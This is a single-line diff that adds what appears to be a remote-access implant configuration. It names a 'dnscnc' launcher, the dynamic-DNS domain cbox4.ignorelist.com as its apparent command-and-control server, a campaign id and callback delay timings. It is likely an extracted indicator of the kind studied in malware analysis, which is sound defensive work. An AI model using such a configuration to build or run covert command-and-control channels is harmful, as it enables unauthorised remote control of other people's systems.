@@ -1,0 +1,1 @@
+launcher_args:['--domain', 'cbox4.ignorelist.com'],cid:2727872009,launcher:dnscnc,delays:[(10, 5, 10), (50, 30, 50), (-1, 150, 300)],
